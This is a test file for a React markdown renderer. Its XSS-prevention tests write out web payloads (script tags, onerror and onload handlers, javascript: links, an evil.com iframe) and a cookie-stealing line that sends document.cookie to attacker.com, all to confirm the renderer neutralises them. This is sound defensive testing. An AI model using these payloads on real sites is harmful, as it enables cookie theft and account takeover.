/**
 * Tests for markdown-renderer component
 *
 * SECURITY TESTS: These tests verify that XSS attacks are properly prevented.
 * react-markdown renders to React components, never raw HTML, making it
 * inherently XSS-safe.
 */
import {render, screen} from '@testing-library/react'
import {describe, expect, it} from 'vitest'

import {hasMarkdownSyntax, MarkdownContent} from '../../lib/markdown-renderer'

describe('MarkdownContent', () => {
  describe('basic markdown rendering', () => {
    it('should render bold text', () => {
      render(<MarkdownContent>**bold text**</MarkdownContent>)
      const strong = screen.getByText('bold text')
      expect(strong.tagName).toBe('STRONG')
    })

    it('should render italic text', () => {
      render(<MarkdownContent>*italic text*</MarkdownContent>)
      const em = screen.getByText('italic text')
      expect(em.tagName).toBe('EM')
    })

    it('should render unordered lists', () => {
      render(<MarkdownContent>{'- item 1\n- item 2'}</MarkdownContent>)
      expect(screen.getByText('item 1')).toBeInTheDocument()
      expect(screen.getByText('item 2')).toBeInTheDocument()
    })

    it('should render ordered lists', () => {
      render(<MarkdownContent>{'1. first\n2. second'}</MarkdownContent>)
      expect(screen.getByText('first')).toBeInTheDocument()
      expect(screen.getByText('second')).toBeInTheDocument()
    })

    it('should render inline code', () => {
      render(<MarkdownContent>use `code` here</MarkdownContent>)
      const code = screen.getByText('code')
      expect(code.tagName).toBe('CODE')
    })

    it('should render code blocks', () => {
      render(<MarkdownContent>{'```\ncode block\n```'}</MarkdownContent>)
      expect(screen.getByText('code block')).toBeInTheDocument()
    })

    it('should render links', () => {
      render(<MarkdownContent>[link](https://example.com)</MarkdownContent>)
      const link = screen.getByRole('link', {name: 'link'})
      expect(link).toHaveAttribute('href', 'https://example.com')
    })

    it('should handle empty content', () => {
      const {container} = render(<MarkdownContent>{''}</MarkdownContent>)
      expect(container).toBeEmptyDOMElement()
    })

    it('should handle plain text without markdown', () => {
      render(<MarkdownContent>Just plain text</MarkdownContent>)
      expect(screen.getByText('Just plain text')).toBeInTheDocument()
    })
  })

  describe('XSS prevention (SECURITY CRITICAL)', () => {
    it('should render script tags as text, not execute them', () => {
      const {container} = render(
        <MarkdownContent>{'<script>alert("xss")</script>'}</MarkdownContent>
      )
      // Script tag should be rendered as text, not as an actual script element
      expect(container.querySelector('script')).toBeNull()
      // The text content should contain the escaped script
      expect(container.textContent).toContain('<script>')
    })

    it('should render script tags in bold as text', () => {
      const {container} = render(
        <MarkdownContent>{'**<script>alert("xss")</script>**'}</MarkdownContent>
      )
      expect(container.querySelector('script')).toBeNull()
      expect(container.querySelector('strong')).toBeInTheDocument()
    })

    it('should not execute img onerror handlers', () => {
      const {container} = render(
        <MarkdownContent>{'<img src=x onerror="alert(1)">'}</MarkdownContent>
      )
      // No actual img element should be created
      expect(container.querySelector('img')).toBeNull()
      // The text should be visible
      expect(container.textContent).toContain('<img')
    })

    it('should not execute onclick handlers', () => {
      const {container} = render(
        <MarkdownContent>{'<div onclick="evil()">click me</div>'}</MarkdownContent>
      )
      // No div with onclick should exist
      const divs = container.querySelectorAll('div')
      divs.forEach(div => {
        expect(div.getAttribute('onclick')).toBeNull()
      })
    })

    it('should not execute svg onload handlers', () => {
      const {container} = render(
        <MarkdownContent>{'<svg onload="alert(1)"></svg>'}</MarkdownContent>
      )
      expect(container.querySelector('svg')).toBeNull()
    })

    it('should not render iframes', () => {
      const {container} = render(
        <MarkdownContent>{'<iframe src="https://evil.com"></iframe>'}</MarkdownContent>
      )
      expect(container.querySelector('iframe')).toBeNull()
    })

    it('should not create javascript: links', () => {
      const {container} = render(
        <MarkdownContent>{'[click](javascript:alert(1))'}</MarkdownContent>
      )
      const links = container.querySelectorAll('a')
      links.forEach(link => {
        const href = link.getAttribute('href')
        expect(href).not.toMatch(/^javascript:/i)
      })
    })

    it('should not create data: links with scripts', () => {
      const {container} = render(
        <MarkdownContent>
          {'[click](data:text/html,<script>alert(1)</script>)'}
        </MarkdownContent>
      )
      const links = container.querySelectorAll('a')
      links.forEach(link => {
        const href = link.getAttribute('href')
        // data: URLs should either not be rendered or be sanitized
        if (href?.startsWith('data:')) {
          expect(href).not.toContain('<script>')
        }
      })
    })

    it('should handle complex XSS payload safely', () => {
      const malicious = `**Track Analysis**
<img src=x onerror='fetch("https://attacker.com/steal?cookie=" + document.cookie)'>
- Energy: High
- Tempo: 120 BPM`

      const {container} = render(<MarkdownContent>{malicious}</MarkdownContent>)

      // No executable elements
      expect(container.querySelector('img')).toBeNull()
      expect(container.querySelector('script')).toBeNull()

      // Valid markdown should still render
      expect(container.querySelector('strong')).toBeInTheDocument()
      expect(screen.getByText('Track Analysis')).toBeInTheDocument()
    })

    it('should handle nested XSS attempts', () => {
      const {container} = render(
        <MarkdownContent>{'**<script>**alert(1)**</script>**'}</MarkdownContent>
      )
      expect(container.querySelector('script')).toBeNull()
    })
  })

  describe('edge cases', () => {
    it('should handle very long content', () => {
      const long = '**bold** '.repeat(100)
      render(<MarkdownContent>{long}</MarkdownContent>)
      const strongs = document.querySelectorAll('strong')
      expect(strongs.length).toBeGreaterThan(0)
    })

    it('should handle unicode characters', () => {
      render(<MarkdownContent>**🎵 Music 音楽**</MarkdownContent>)
      expect(screen.getByText('🎵 Music 音楽')).toBeInTheDocument()
    })

    it('should handle mixed markdown and plain text', () => {
      render(<MarkdownContent>Start **bold** middle *italic* end</MarkdownContent>)
      expect(screen.getByText('bold')).toBeInTheDocument()
      expect(screen.getByText('italic')).toBeInTheDocument()
    })

    it('should apply className to wrapper div', () => {
      const {container} = render(
        <MarkdownContent className="custom-class">**test**</MarkdownContent>
      )
      // The wrapper div should have the class
      const wrapper = container.querySelector('.custom-class')
      expect(wrapper).toBeInTheDocument()
    })
  })
})

describe('hasMarkdownSyntax', () => {
  it('should detect bold syntax', () => {
    expect(hasMarkdownSyntax('**bold**')).toBe(true)
    expect(hasMarkdownSyntax('__bold__')).toBe(true)
  })

  it('should detect italic syntax', () => {
    expect(hasMarkdownSyntax('*italic*')).toBe(true)
    expect(hasMarkdownSyntax('_italic_')).toBe(true)
  })

  it('should detect code syntax', () => {
    expect(hasMarkdownSyntax('`code`')).toBe(true)
    expect(hasMarkdownSyntax('```block```')).toBe(true)
  })

  it('should detect link syntax', () => {
    expect(hasMarkdownSyntax('[link](url)')).toBe(true)
  })

  it('should detect list syntax', () => {
    expect(hasMarkdownSyntax('- item')).toBe(true)
    expect(hasMarkdownSyntax('* item')).toBe(true)
    expect(hasMarkdownSyntax('+ item')).toBe(true)
    expect(hasMarkdownSyntax('1. item')).toBe(true)
  })

  it('should detect heading syntax', () => {
    expect(hasMarkdownSyntax('# Heading')).toBe(true)
    expect(hasMarkdownSyntax('## Subheading')).toBe(true)
  })

  it('should return false for plain text', () => {
    expect(hasMarkdownSyntax('Just plain text')).toBe(false)
    expect(hasMarkdownSyntax('No markdown here')).toBe(false)
  })

  it('should return false for empty content', () => {
    expect(hasMarkdownSyntax('')).toBe(false)
  })

  it('should handle null-like values', () => {
    // @ts-expect-error Testing invalid input
    expect(hasMarkdownSyntax(null)).toBe(false)
    // @ts-expect-error Testing invalid input
    expect(hasMarkdownSyntax(undefined)).toBe(false)
  })
})
